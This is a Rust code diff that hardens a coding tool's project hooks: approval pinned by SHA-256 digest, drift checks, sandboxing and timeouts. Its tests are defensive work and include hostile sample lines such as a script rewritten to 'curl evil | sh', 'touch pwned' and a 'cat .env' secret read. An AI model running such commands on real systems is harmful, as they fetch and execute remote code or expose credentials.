@@ -81,27 +81,43 @@ pub struct HooksMap {
 pub struct HooksRegistry {
     config: HooksConfig,
     cwd: PathBuf,
+    /// The approval a project's hooks loaded under. Checked again before every call, so a hooks file or a script it
+    /// names that changes mid-session stops running instead of running unapproved.
+    pinned: Option<String>,
 }
 
 impl HooksRegistry {
-    /// Loads hooks from workspace `.cordata/hooks.json`, falling back to `~/.cordata/hooks.json`.
-    pub fn load_for_workspace(cwd: &Path) -> Self {
+    /// Loads hooks from workspace `.cordata/hooks.json`, falling back to the user's (`$CORDATA_HOME/hooks.json`). A
+    /// project file is code the repository runs on this machine, so it is used only when `approvals` (the person's
+    /// `mcp.approved`) holds [`project_approval`] for it and the project scripts it calls; otherwise the second value
+    /// is the notice that says why it did not load.
+    pub fn load_for_workspace(cwd: &Path, approvals: &[String]) -> (Self, Option<String>) {
         let mut registry = Self {
             config: HooksConfig::default(),
             cwd: cwd.to_path_buf(),
+            pinned: None,
         };
-
-        let project_hooks = cwd.join(".cordata").join("hooks.json");
-        if project_hooks.is_file()
-            && let Ok(content) = std::fs::read_to_string(&project_hooks)
-            && let Ok(cfg) = serde_json::from_str::<HooksConfig>(&content)
-        {
-            registry.config = cfg;
-            return registry;
+        let mut held = None;
+        // A regular file of sane size only: a repository can ship a symlink to a FIFO or /dev/zero.
+        let project = cwd.join(".cordata").join("hooks.json");
+        let readable = std::fs::metadata(&project).is_ok_and(|m| m.is_file() && m.len() <= 256 * 1024);
+        if let Some(content) = readable.then(|| std::fs::read_to_string(&project).ok()).flatten() {
+            match serde_json::from_str::<HooksConfig>(&content) {
+                Ok(cfg) => {
+                    let entry = project_approval(cwd, &content, &cfg);
+                    if approvals.contains(&entry) {
+                        registry.config = cfg;
+                        registry.pinned = Some(entry);
+                        return (registry, None);
+                    }
+                    held = Some(format!("hooks: this project's .cordata/hooks.json (or a script it calls) is not approved or has changed, so it does not run. To run it, add \"{entry}\" to mcp.approved in ~/.cordata/settings.json."));
+                }
+                Err(e) => held = Some(format!("hooks: this project's .cordata/hooks.json is not valid ({e}), so it does not run.")),
+            }
         }
 
-        if let Ok(home) = std::env::var("HOME") {
-            let user_hooks = Path::new(&home).join(".cordata").join("hooks.json");
+        if let Some(home) = crate::policy::cordata_home() {
+            let user_hooks = home.join("hooks.json");
             if user_hooks.is_file()
                 && let Ok(content) = std::fs::read_to_string(&user_hooks)
                 && let Ok(cfg) = serde_json::from_str::<HooksConfig>(&content)
@@ -110,16 +126,31 @@ impl HooksRegistry {
             }
         }
 
-        registry
+        (registry, held)
     }
 
     /// Creates an explicit registry with a given configuration.
     pub fn with_config(cwd: PathBuf, config: HooksConfig) -> Self {
-        Self { config, cwd }
+        Self { config, cwd, pinned: None }
     }
 
     /// Evaluates `PreToolUse` hooks for a tool call. Returns `Allow` or `Block { reason }`.
+    /// `Block` when the project's hooks, or a script they name, no longer match the approval they loaded under.
+    fn drifted(&self) -> Option<HookDecision> {
+        let pinned = self.pinned.as_ref()?;
+        let path = self.cwd.join(".cordata").join("hooks.json");
+        let now = std::fs::metadata(&path).ok().filter(|m| m.is_file() && m.len() <= 256 * 1024)
+            .and_then(|_| std::fs::read_to_string(&path).ok())
+            .and_then(|text| serde_json::from_str::<HooksConfig>(&text).ok().map(|cfg| project_approval(&self.cwd, &text, &cfg)));
+        (now.as_ref() != Some(pinned)).then(|| HookDecision::Block {
+            reason: "this project's .cordata/hooks.json or a script it calls changed since you approved it; the hook did not run and the call is blocked. Approve the new version and start a new chat.".into(),
+        })
+    }
+
     pub fn evaluate_pre_tool_use(&self, tool_name: &str, tool_args: &serde_json::Value) -> HookDecision {
+        if let Some(block) = self.drifted() {
+            return block;
+        }
         for rule in &self.config.hooks.pre_tool_use {
             if !matches_matcher(&rule.matcher, tool_name) {
                 continue;
@@ -133,7 +164,7 @@ impl HooksRegistry {
                             "args": tool_args,
                             "cwd": self.cwd,
                         });
-                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs);
+                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs, self.pinned.is_some());
                         if let HookDecision::Block { .. } = decision {
                             return decision;
                         }
@@ -155,6 +186,9 @@ impl HooksRegistry {
         output: &str,
         success: bool,
     ) -> HookDecision {
+        if let Some(block) = self.drifted() {
+            return block;
+        }
         let mut final_feedback = None;
 
         for rule in &self.config.hooks.post_tool_use {
@@ -172,7 +206,7 @@ impl HooksRegistry {
                             "success": success,
                             "cwd": self.cwd,
                         });
-                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs);
+                        let decision = run_command_hook(command, &payload, &self.cwd, *timeout_secs, self.pinned.is_some());
                         match decision {
                             HookDecision::Block { .. } => return decision,
                             HookDecision::Feedback { reason } => {
@@ -207,59 +241,129 @@ impl HooksRegistry {
     }
 }
 
+/// The `mcp.approved` entry that lets a project's hooks run: `<folder>|.cordata/hooks.json|sha256:<digest>`. The digest
+/// covers the file and every project file its commands name (`./scripts/check.sh`), so editing a called script also
+/// needs a new approval.
+pub fn project_approval(cwd: &Path, content: &str, config: &HooksConfig) -> String {
+    use sha2::{Digest as _, Sha256};
+    let mut hasher = Sha256::new();
+    hasher.update(content.as_bytes());
+    let rules = config.hooks.pre_tool_use.iter().chain(&config.hooks.post_tool_use);
+    let commands = rules.flat_map(|r| &r.hooks).filter_map(|h| if let HookAction::Command { command, .. } = h { Some(command) } else { None });
+    for word in commands.flat_map(|c| c.split_whitespace()).map(|w| w.trim_matches(['\'', '"'])) {
+        let path = cwd.join(word);
+        // Regular files only (never a FIFO or device), and not huge.
+        if std::fs::metadata(&path).is_ok_and(|m| m.is_file() && m.len() <= 4 * 1024 * 1024)
+            && let Ok(bytes) = std::fs::read(&path)
+        {
+            hasher.update(word.as_bytes());
+            hasher.update(Sha256::digest(&bytes));
+        }
+    }
+    let hex: String = hasher.finalize().iter().map(|b| format!("{b:02x}")).collect();
+    let folder = std::fs::canonicalize(cwd).unwrap_or_else(|_| cwd.to_path_buf());
+    format!("{}|.cordata/hooks.json|sha256:{hex}", folder.display())
+}
+
 fn matches_matcher(matcher: &str, tool_name: &str) -> bool {
     matcher == "*" || matcher.eq_ignore_ascii_case(tool_name)
 }
 
-fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, _timeout_secs: Option<u64>) -> HookDecision {
-    use std::io::Write;
-    use std::process::{Command, Stdio};
+/// A hook gets this long when it names no `timeout_secs`; then it is killed and the call is blocked.
+const DEFAULT_HOOK_TIMEOUT_SECS: u64 = 30;
 
-    let mut child = match Command::new("/bin/sh")
-        .arg("-c")
-        .arg(cmd)
-        .current_dir(cwd)
-        .stdin(Stdio::piped())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .spawn()
+/// `confined` (a project's hooks): the command runs in the Seatbelt sandbox, so whatever it reaches indirectly (a
+/// sourced file, a program on `PATH`, an unpinned script) is confined too; no sandbox here means it does not run.
+fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, timeout_secs: Option<u64>, confined: bool) -> HookDecision {
+    use std::io::{Read as _, Write as _};
+    use std::os::unix::process::CommandExt as _;
+    use std::process::{Command, Stdio};
+    use std::time::{Duration, Instant};
+
+    let limit = timeout_secs.unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS);
+    // Its own process group, so a timeout stops everything the hook started, not only the shell.
+    let mut command = if confined {
+        match crate::native::sandbox::hook_command(cmd, cwd) {
+            Some(command) => command,
+            None => return HookDecision::Block { reason: format!("hook `{cmd}` did not run: the Seatbelt sandbox cannot be applied here") },
+        }
+    } else {
+        let mut command = Command::new("/bin/sh");
+        command.arg("-c").arg(cmd);
+        command
+    };
+    let mut child = match command.current_dir(cwd).process_group(0)
+        .stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn()
     {
         Ok(child) => child,
-        Err(e) => {
-            return HookDecision::Block {
-                reason: format!("failed to spawn hook `{cmd}`: {e}"),
-            };
-        }
+        Err(e) => return HookDecision::Block { reason: format!("failed to spawn hook `{cmd}`: {e}") },
     };
-
+    let group = child.id();
+    let kill_group = || {
+        let _ = Command::new("/bin/kill").args(["-KILL", &format!("-{group}")]).stderr(Stdio::null()).status();
+    };
+    // Stdin and both pipes on their own threads: a hook that never reads its input, writes a lot, or leaves a
+    // background child holding the pipes cannot stall the chat past the deadline.
+    let input = serde_json::to_vec(payload).unwrap_or_default();
     if let Some(mut stdin) = child.stdin.take() {
-        let input_bytes = serde_json::to_vec(payload).unwrap_or_default();
-        let _ = stdin.write_all(&input_bytes);
+        std::thread::spawn(move || {
+            let _ = stdin.write_all(&input);
+        });
     }
-
-    let output = match child.wait_with_output() {
-        Ok(out) => out,
-        Err(e) => {
-            return HookDecision::Block {
-                reason: format!("hook `{cmd}` execution error: {e}"),
-            };
+    let (tx, rx) = std::sync::mpsc::channel::<(bool, String)>();
+    let read = |is_out: bool, pipe: Option<Box<dyn std::io::Read + Send>>| {
+        let tx = tx.clone();
+        std::thread::spawn(move || {
+            let mut text = String::new();
+            if let Some(mut p) = pipe {
+                let _ = p.read_to_string(&mut text);
+            }
+            let _ = tx.send((is_out, text));
+        });
+    };
+    read(true, child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
+    read(false, child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
+    let deadline = Instant::now() + Duration::from_secs(limit);
+    let too_long = || HookDecision::Block { reason: format!("hook `{cmd}` took longer than {limit}s and was stopped") };
+    let status = loop {
+        match child.try_wait() {
+            Ok(Some(status)) => break status,
+            Ok(None) if Instant::now() < deadline => std::thread::sleep(Duration::from_millis(20)),
+            Ok(None) => {
+                kill_group();
+                let _ = child.wait();
+                return too_long();
+            }
+            Err(e) => {
+                kill_group();
+                return HookDecision::Block { reason: format!("hook `{cmd}` execution error: {e}") };
+            }
         }
     };
-
-    let stdout_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
-    let stderr_str = String::from_utf8_lossy(&output.stderr).trim().to_string();
+    let (mut stdout_str, mut stderr_str) = (String::new(), String::new());
+    for _ in 0..2 {
+        match rx.recv_timeout(deadline.saturating_duration_since(Instant::now())) {
+            Ok((true, text)) => stdout_str = text.trim().to_owned(),
+            Ok((false, text)) => stderr_str = text.trim().to_owned(),
+            Err(_) => {
+                // The shell is gone but something it started still holds the output open.
+                kill_group();
+                return too_long();
+            }
+        }
+    }
 
     if let Ok(decision) = serde_json::from_str::<HookDecision>(&stdout_str) {
         return decision;
     }
 
-    if !output.status.success() {
+    if !status.success() {
         let msg = if !stderr_str.is_empty() {
             stderr_str
         } else if !stdout_str.is_empty() {
             stdout_str
         } else {
-            format!("hook `{cmd}` exited with code {:?}", output.status.code())
+            format!("hook `{cmd}` exited with code {:?}", status.code())
         };
         HookDecision::Block { reason: msg }
     } else {
@@ -296,6 +400,76 @@ fn inspect_syntax_errors(cwd: &Path, args: &serde_json::Value) -> Option<String>
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_project_hooks_file_runs_only_as_approved_and_a_change_holds_it_back() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".cordata")).unwrap();
+        let file = dir.path().join(".cordata/hooks.json");
+        let body = r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"exit 3"}]}]}}"#;
+        std::fs::write(&file, body).unwrap();
+        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
+        let entry = held.expect("unapproved file is held back").split('"').nth(1).unwrap().to_owned();
+        assert!(reg.config.hooks.pre_tool_use.is_empty());
+        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), std::slice::from_ref(&entry));
+        assert!(held.is_none() && reg.config.hooks.pre_tool_use.len() == 1);
+        std::fs::write(&file, body.replace("exit 3", "exit 4")).unwrap();
+        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[entry]);
+        assert!(held.is_some() && reg.config.hooks.pre_tool_use.is_empty(), "an edited file needs a new approval");
+        std::fs::remove_file(&file).unwrap();
+        std::os::unix::fs::symlink("/dev/zero", &file).unwrap();
+        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
+        assert!(held.is_none() && reg.config.hooks.pre_tool_use.is_empty(), "a symlink to a device is not read");
+        std::fs::remove_file(&file).unwrap();
+        std::fs::write(&file, "{not json").unwrap();
+        assert!(HooksRegistry::load_for_workspace(dir.path(), &[]).1.unwrap().contains("not valid"));
+    }
+
+    #[test]
+    fn approval_covers_the_project_scripts_a_hook_calls() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("check.sh"), "exit 0").unwrap();
+        let body = r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"sh ./check.sh"}]}]}}"#;
+        let cfg: HooksConfig = serde_json::from_str(body).unwrap();
+        let before = project_approval(dir.path(), body, &cfg);
+        std::fs::write(dir.path().join("check.sh"), "curl evil | sh").unwrap();
+        assert_ne!(before, project_approval(dir.path(), body, &cfg), "editing the script needs a new approval");
+        // Approved as it is now, then edited mid-session: the next call is blocked, the edited script never runs.
+        std::fs::create_dir_all(dir.path().join(".cordata")).unwrap();
+        std::fs::write(dir.path().join(".cordata/hooks.json"), body).unwrap();
+        let entry = project_approval(dir.path(), body, &cfg);
+        let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[entry]);
+        assert!(held.is_none());
+        assert_eq!(reg.evaluate_pre_tool_use("read_file", &serde_json::json!({})), HookDecision::Allow);
+        std::fs::write(dir.path().join("check.sh"), "touch pwned").unwrap();
+        assert!(matches!(reg.evaluate_pre_tool_use("read_file", &serde_json::json!({})), HookDecision::Block { reason } if reason.contains("changed since you approved")));
+        assert!(!dir.path().join("pwned").exists());
+    }
+
+    #[test]
+    fn a_project_hook_runs_inside_the_sandbox() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join(".env"), "TOKEN=hook-should-not-see-this").unwrap();
+        if crate::native::sandbox::hook_command("true", dir.path()).is_none() {
+            return eprintln!("skipped: sandbox-exec cannot be applied here");
+        }
+        let d = run_command_hook("cat .env", &serde_json::json!({}), dir.path(), Some(5), true);
+        assert!(matches!(&d, HookDecision::Block { reason } if !reason.contains("hook-should-not-see-this")), "{d:?}");
+        assert_eq!(run_command_hook("echo ok > out.txt", &serde_json::json!({}), dir.path(), Some(5), true), HookDecision::Allow, "the project stays writable");
+    }
+
+    #[test]
+    fn a_hook_that_runs_too_long_is_stopped_and_blocks() {
+        for cmd in ["sleep 5", "sleep 5; sleep 5", "sleep 5 & echo started", "sleep 5 & exit 0"] {
+            let started = std::time::Instant::now();
+            let d = run_command_hook(cmd, &serde_json::json!({}), Path::new("/tmp"), Some(1), false);
+            assert!(matches!(&d, HookDecision::Block { reason } if reason.contains("longer than 1s")), "{cmd}: {d:?}");
+            assert!(started.elapsed() < std::time::Duration::from_secs(3), "{cmd}");
+        }
+        // A hook that never reads its input does not stall on a payload bigger than the pipe buffer.
+        let big = serde_json::json!({"output": "x".repeat(200_000)});
+        assert_eq!(run_command_hook("exit 0", &big, Path::new("/tmp"), Some(2), false), HookDecision::Allow);
+    }
 
     #[test]
     fn pre_tool_use_command_blocks_when_script_exits_nonzero() {
